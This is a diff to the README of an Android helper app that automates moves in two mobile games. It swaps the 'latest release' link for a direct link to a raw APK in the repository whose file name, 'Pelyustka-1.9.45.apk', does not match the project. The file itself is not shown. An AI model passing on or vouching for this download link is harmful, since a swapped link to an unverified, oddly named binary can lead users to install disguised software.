@@ -5,14 +5,14 @@ game board on your phone and automates moves in **Backpack Blitz** and
 **Merge Madness**. It also reminds you when timed game rewards are ready.
 
 <p align="center">
-  <a href="https://github.com/PacManNa/Backpack-Brawl-Helper/releases/latest"><strong>⬇ Download the latest APK</strong></a>
+  <a href="https://github.com/PacManNa/Backpack-Brawl-Helper/raw/refs/heads/main/downloads/Pelyustka-1.9.45.apk"><strong>⬇ Download APK 1.9.45</strong></a>
   &nbsp;·&nbsp;
   <a href="docs/USAGE.md">User guide</a>
   &nbsp;·&nbsp;
   <a href="docs/BUILDING.md">Build guide</a>
 </p>
 
-Download the APK once and install it from your phone. **The APK installs
+Download the [APK 1.9.45](https://github.com/PacManNa/Backpack-Brawl-Helper/raw/refs/heads/main/downloads/Pelyustka-1.9.45.apk) once and install it from your phone. **The APK installs
 offline, and the app does not request internet access.**
 
 ## 🎮 Game modes
